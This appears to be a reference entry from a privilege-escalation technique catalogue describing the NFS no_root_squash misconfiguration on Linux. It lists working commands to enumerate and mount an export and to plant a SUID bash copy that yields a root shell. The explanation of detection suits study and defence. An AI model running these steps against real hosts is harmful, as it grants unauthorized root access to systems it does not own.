---
id: priv-005
title: "NFS No_Root_Squash"
category: privilege_escalation
tags: [nfs, no_root_squash, suid, linux-privesc, network-filesystem]
platform: [linux]
commands:
  - "showmount -e <target-ip>"
  - "cat /etc/exports"
  - "mount -t nfs <target-ip>:/exported/path /mnt/nfs"
  - "cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash"
  - "/mnt/nfs/bash -p"
references:
  - "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe"
  - "https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/"
---

When an NFS export is configured with the `no_root_squash` option, the NFS server does not map the root user from the NFS client to the anonymous `nfsnobody` account, meaning a root user on an NFS client retains root-level access on the exported filesystem. An attacker with root on any machine that can mount the share can copy a SUID shell binary into the export directory; the target machine's unprivileged user can then execute this binary to obtain a root shell locally. The vulnerability is identified by inspecting `/etc/exports` on the server or by using `showmount -e` remotely to enumerate NFS exports and their options.
